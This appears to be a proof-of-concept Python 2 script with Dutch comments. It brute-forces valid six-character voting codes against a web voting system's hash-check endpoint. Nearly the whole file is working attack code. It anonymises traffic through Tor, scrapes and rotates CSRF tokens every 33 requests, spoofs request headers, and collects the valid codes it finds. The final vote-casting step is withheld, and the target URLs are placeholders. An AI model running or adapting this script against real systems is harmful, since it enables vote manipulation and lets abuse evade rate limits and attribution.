#!/bin/env python
# -*- coding: utf-8 -*-


"""

POC.
Quickly bruteforce valid six letter/number combinations
for a voting system with valid CSRF tokens

Using TOR 


"""


import requesocks
import random, string


def combinatie():
	reeks = string.uppercase + string.digits 
	return ''.join(random.choice(reeks) for _ in xrange(6))
getallenreeks =[]

def stemmen(geldig):
	#not disclosing this
	print "[!] I'm not disclosing this"

t1 = combinatie()
for x in range(0,330):
	getallenreeks.append(combinatie())
verzoek = requesocks.session()


headers = {'User-Agent': 'incompetente prutser'}
starturl = '{form main page here}/questions/'
testurl = '{hash page check}/check_hash/'
# Tor zetten
verzoek.proxies = {'http':  'socks5://127.0.0.1:9050',
                   'https': 'socks5://127.0.0.1:9050'}
mijnip = verzoek.get("http://httpbin.org/ip").text.split('"origin": "')[1].split('"')[0]
print '[+] we gebruiken ip '+str(mijnip)

token = verzoek.get(starturl, headers=headers).text.split("name='csrfmiddlewaretoken' value='")[1].split("'")[0]
print '[+] CSRF token is ' + str(token)

headers = {'User-Agent': 'incompetente prutser','X-CSRFToken': token,"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8","Accept":" text/html, */*; q=0.01","Referer":" https//m.flyscoot.com/select","X-Requested-With":" XMLHttpRequest","Connection":" keep-alive","AlexaToolbar-ALX_NS_PH":" AlexaToolbar/alxg-3.3"}
cookies = dict(csrftoken=token)
faal = 0
goed = 0
teller = 0
geldig = []
for x in getallenreeks:

	if teller == 33:

		mijnip = verzoek.get("http://httpbin.org/ip").text.split('"origin": "')[1].split('"')[0]
		print '[+] we gebruiken ip '+str(mijnip)

		token = verzoek.get(starturl, headers=headers).text.split("name='csrfmiddlewaretoken' value='")[1].split("'")[0]
		print '[+] token ophalen ' + str(token)

		headers = {'User-Agent': 'incompetente prutser','X-CSRFToken': token,"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8","Accept":" text/html, */*; q=0.01","Referer":" https//m.flyscoot.com/select","X-Requested-With":" XMLHttpRequest","Connection":" keep-alive","X-BonziBuddy":"1"}
		cookies = dict(csrftoken=token)

		teller = 0

	hashpost = {'hash': x}
	res = verzoek.post(testurl, headers=headers,cookies=cookies, data=hashpost).text
	if res == 'False':
		faal = faal + 1
	else:
		print '[+] geldige token gevonden '+x
		goed =  goed + 1
		geldig.append(x)
	teller = teller + 1

if goed >= 1:
	stemmen(goed)

print "[!] "+str(goed)+" geslaagde pogingen, "+str(faal)+" gefaalt"







